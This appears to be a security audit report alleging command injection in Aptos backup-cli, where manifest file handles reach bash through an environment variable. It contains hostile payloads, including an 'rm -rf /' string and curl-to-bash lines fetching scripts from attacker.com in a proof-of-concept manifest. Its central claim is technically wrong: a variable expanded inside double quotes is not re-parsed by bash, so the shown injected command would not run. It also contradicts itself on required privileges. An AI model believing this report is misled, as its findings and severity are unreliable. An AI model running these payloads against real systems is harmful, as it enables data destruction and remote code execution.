# Audit Report

## Title
Command Injection in Backup-CLI FileHandle Processing Leads to Remote Code Execution on Validator Nodes

## Summary
The `open_for_read()` function in the backup-cli's CommandAdapter storage backend accepts unvalidated FileHandle strings from backup manifests and injects them directly into bash commands via environment variables. An attacker with write access to backup storage can craft malicious manifests containing FileHandles with command injection payloads (e.g., `"; rm -rf / #"`), leading to arbitrary code execution on validator nodes during restore operations. [1](#0-0) 

## Finding Description

The vulnerability exists in the data flow from backup manifests to shell command execution:

1. **No FileHandle Validation**: FileHandle is defined as a plain `String` type alias with zero validation, unlike `ShellSafeName` which has strict regex-based sanitization. [1](#0-0) 

2. **Manifests Contain FileHandles**: State snapshot manifests store FileHandles pointing to blob and proof files. These manifests are serialized to JSON and stored in the backup storage itself. [2](#0-1) 

3. **Manifests Loaded During Restore**: During restore operations, manifests are loaded from backup storage and deserialized, extracting the FileHandle values. [3](#0-2) 

4. **FileHandles Used to Read Files**: The FileHandles from manifests are passed to `open_for_read()` which converts them to environment variables. [4](#0-3) 

5. **Environment Variables Injected into Bash Commands**: The FileHandle is set as the `FILE_HANDLE` environment variable and used directly in bash commands defined in the configuration. [5](#0-4) 

6. **Unsafe Variable Usage in Sample Configs**: The sample configurations use `$FILE_HANDLE` within double quotes in bash commands without proper escaping. [6](#0-5) 

**Attack Scenario:**

An attacker who gains write access to backup storage (e.g., compromised S3 credentials, or during restore from an untrusted backup source) can:

1. Create or modify a state snapshot manifest JSON file
2. Inject a malicious FileHandle such as: `"; curl http://attacker.com/backdoor.sh | bash #"`
3. When a validator performs a restore operation using this manifest, the malicious FileHandle propagates through: `load_json_file()` → `load_bcs_file()` → `read_all()` → `open_for_read()`
4. The command executed becomes: `aws s3 cp "s3://$BUCKET/$SUB_DIR/"; curl http://attacker.com/backdoor.sh | bash #" - | gzip -cd`
5. The double quote closes the string, `;` executes the malicious command, and `#` comments out the rest

## Impact Explanation

**Severity: Critical** (per Aptos Bug Bounty criteria: Remote Code Execution on validator node)

This vulnerability enables:
- **Complete validator node compromise**: Attacker gains shell access with validator process privileges
- **Consensus manipulation**: Compromised nodes can equivocate, sign malicious blocks, or cause safety violations
- **State corruption**: Attacker can manipulate the restored database state
- **Key theft**: Access to validator private keys stored on the node
- **Network-wide impact**: If multiple validators restore from the same compromised backup, multiple nodes are simultaneously compromised

The impact qualifies for the highest severity category as it directly enables Remote Code Execution on validator infrastructure without requiring prior privileged access.

## Likelihood Explanation

**Likelihood: Medium to High**

**Favorable factors for attackers:**
- Backup storage is often a high-value target with potentially weaker security than the blockchain nodes themselves
- Organizations frequently use third-party cloud storage with IAM credentials that may be compromised
- Restore operations commonly occur during disaster recovery, node migrations, or new validator setup when operators may be under time pressure
- The vulnerability requires no special timing or race conditions
- Manifests are JSON files that are straightforward to parse and modify

**Prerequisites for exploitation:**
- Write access to backup storage (realistic via compromised credentials, insider threat, or supply chain attack)
- Target validator must perform a restore operation using the compromised manifest
- Configuration must use the vulnerable command patterns (all sample configs exhibit this pattern)

The combination of realistic attack prerequisites and severe impact makes this a critical vulnerability that should be addressed immediately.

## Recommendation

**Immediate Fix: Implement FileHandle Validation**

Add strict validation for FileHandle values similar to `ShellSafeName`:

```rust
// In storage/backup/backup-cli/src/storage/mod.rs

use once_cell::sync::Lazy;
use regex::Regex;

pub struct ValidatedFileHandle(String);

impl ValidatedFileHandle {
    // Allow only safe characters: alphanumeric, forward slash, hyphen, underscore, dot
    // Reject shell metacharacters: quotes, semicolons, pipes, redirects, etc.
    const PATTERN: &'static str = r"\A[a-zA-Z0-9/_.-]+\z";
    
    fn sanitize(handle: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ValidatedFileHandle::PATTERN).unwrap());
        ensure!(RE.is_match(handle), "Illegal file handle: {}", handle);
        ensure!(handle.len() <= 1024, "File handle too long");
        Ok(())
    }
}

impl TryFrom<String> for ValidatedFileHandle {
    type Error = anyhow::Error;
    
    fn try_from(value: String) -> Result<Self> {
        Self::sanitize(&value).map(|_| Self(value))
    }
}
```

**Additional Mitigations:**

1. **Use shellwords/shell-escape crate** in command construction to properly escape all shell metacharacters
2. **Validate manifests with digital signatures** to ensure integrity and authenticity
3. **Add warnings** when restoring from external/untrusted backup sources
4. **Implement command allowlisting** to restrict what commands can be executed via CommandAdapter

## Proof of Concept

**Step 1: Create malicious manifest**

```json
{
  "version": 1234567,
  "epoch": 10,
  "root_hash": "0x1234567890abcdef...",
  "chunks": [
    {
      "first_idx": 0,
      "last_idx": 999,
      "first_key": "0x00...",
      "last_key": "0xff...",
      "blobs": "\"; curl http://attacker.com/exfiltrate.sh | bash #",
      "proof": "legitimate_proof_handle"
    }
  ],
  "proof": "legitimate_proof_handle"
}
```

**Step 2: Upload malicious manifest to backup storage**

```bash
# Assuming compromised AWS credentials
aws s3 cp malicious_manifest.json s3://aptos-backup/backup1/e1/metadata/state_snapshot_ver_1234567.json
```

**Step 3: Trigger restore operation**

```bash
aptos-db-tool restore \
    --command-adapter-config s3_config.yaml \
    --target-db /data/db \
    --target-version 1234567
```

**Expected Result:** During restore, when processing the manifest, the `open_for_read()` function is called with the malicious FileHandle, resulting in command execution:

```bash
# Executed command becomes:
aws s3 cp "s3://aptos-backup/backup1/e1/"; curl http://attacker.com/exfiltrate.sh | bash #" - | gzip -cd
```

The attacker's script at `http://attacker.com/exfiltrate.sh` executes with validator process privileges, establishing a backdoor or exfiltrating sensitive data.

**Verification:** Monitor network traffic or system logs for the curl request to the attacker's domain, confirming successful command injection and code execution.

## Notes

This vulnerability demonstrates a critical failure to validate untrusted external data before using it in security-sensitive operations. While Rust's `Command::env()` safely sets environment variables, the subsequent use of those variables in user-defined bash commands without sanitization creates the injection vector.

The sample configurations provided by Aptos all exhibit this vulnerability pattern, suggesting that most production deployments using CommandAdapter are potentially affected. The fix requires both code-level validation and updated configuration templates with proper shell escaping.

### Citations

**File:** storage/backup/backup-cli/src/storage/mod.rs (L40-41)
```rust
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/manifest.rs (L23-27)
```rust
    pub blobs: FileHandle,
    /// BCS serialized `SparseMerkleRangeProof` that proves this chunk adds up to the root hash
    /// indicated in the backup (`StateSnapshotBackup::root_hash`).
    pub proof: FileHandle,
}
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L123-126)
```rust
        let manifest: StateSnapshotBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
        let (txn_info_with_proof, li): (TransactionInfoWithProof, LedgerInfoWithSignatures) =
            self.storage.load_bcs_file(&manifest.proof).await?;
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L114-124)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let child = self
            .cmd(&self.config.commands.open_for_read, vec![
                EnvVar::file_handle(file_handle.to_string()),
            ])
            .spawn()?;
        Ok(Box::new(child.into_data_source()))
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L68-79)
```rust
        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/s3.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```
